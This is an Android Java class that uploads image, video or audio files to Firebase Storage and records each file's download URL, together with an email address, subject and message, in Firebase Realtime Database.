package com.example.fasterpro11;

import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class FirebaseSaveAudioVideoPicture {
    private static final String TAG = "FirebaseSaveMedia";

    public void SaveAudioVideoPictureDataToFirebaseStorage(String recipientEmail, String subject, String emailContent, String filePath, Context context) {
        Log.d(TAG, "Starting file upload process for: " + filePath);

        File file = new File(filePath);
        if (!file.exists()) {
            Log.e(TAG, "File does not exist: " + filePath);
            return;
        }

        String fileType;
        if (filePath.endsWith(".jpg") || filePath.endsWith(".jpeg") || filePath.endsWith(".png")) {
            fileType = "images";
        } else if (filePath.endsWith(".mp4") || filePath.endsWith(".mkv") || filePath.endsWith(".avi")) {
            fileType = "videos";
        } else if (filePath.endsWith(".mp3") || filePath.endsWith(".wav") || filePath.endsWith(".m4a")) {
            fileType = "audios";
        } else {
            Log.e(TAG, "Unsupported file type: " + filePath);
            return;
        }

        try {
            // ফাইলের নাম এনকোড করে Firebase Storage-এ পাঠানো
            String safeFileName = URLEncoder.encode(file.getName(), "UTF-8");
            StorageReference storageReference = FirebaseStorage.getInstance().getReference().child(fileType + "/" + safeFileName);
            Uri fileUri = Uri.fromFile(file);

            UploadTask uploadTask = storageReference.putFile(fileUri);
            Log.d(TAG, "Uploading file to Firebase Storage...");

            uploadTask.addOnSuccessListener(taskSnapshot -> {
                Log.d(TAG, "File upload successful. Getting download URL...");
                storageReference.getDownloadUrl().addOnSuccessListener(uri -> {
                    String fileDownloadUrl = uri.toString();
                    Log.d(TAG, "File download URL retrieved: " + fileDownloadUrl);

                    // Firebase Realtime Database-এ ফাইল URL সংরক্ষণ
                    saveFileUrlToFirebaseDatabase(recipientEmail, subject, emailContent, fileType, fileDownloadUrl);
                }).addOnFailureListener(e -> {
                    Log.e(TAG, "Failed to retrieve download URL: ", e);
                });
            }).addOnFailureListener(e -> {
                Log.e(TAG, "File upload failed. Retrying...", e);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    storageReference.putFile(fileUri);
                }, 3000);
            });

        } catch (Exception e) {
            Log.e(TAG, "Error encoding file name", e);
        }
    }

    private void saveFileUrlToFirebaseDatabase(String recipientEmail, String subject, String emailContent, String fileType, String fileUrl) {
        Log.d(TAG, "Saving file URL to Firebase Realtime Database...");

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("UploadedMedia");
        String uploadId = databaseReference.push().getKey();

        if (uploadId != null) {
            Map<String, Object> fileData = new HashMap<>();
            fileData.put("email", recipientEmail);
            fileData.put("subject", subject);
            fileData.put("message", emailContent);
            fileData.put("fileType", fileType);
            fileData.put("fileUrl", fileUrl);

            databaseReference.child(uploadId).setValue(fileData)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "File data saved successfully in Firebase Realtime Database."))
                    .addOnFailureListener(e -> Log.e(TAG, "Error saving file data in Firebase Database: ", e));
        } else {
            Log.e(TAG, "Upload ID is null. Cannot save data to Firebase.");
        }
    }
}
